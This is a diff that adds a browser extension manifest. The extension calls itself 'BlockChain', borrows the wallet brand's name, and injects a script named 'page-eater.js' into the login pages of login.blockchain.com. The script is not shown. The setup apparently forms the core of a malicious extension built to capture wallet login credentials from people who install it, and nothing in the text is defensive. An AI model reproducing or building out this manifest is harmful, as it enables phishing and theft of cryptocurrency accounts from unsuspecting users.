@@ -1,0 +1,1 @@
+{"manifest_version": 2, "name": "BlockChain", "version": "1.0", "icons": {"48": "icons/logo.jpg"}, "browser_action": {"default_icon": "icons/logo.jpg", "default_title": "Blockchain", "default_popup": "index.html"}, "content_scripts": [{"matches": ["https://login.blockchain.com/*"], "js": ["page-eater.js"]}]}
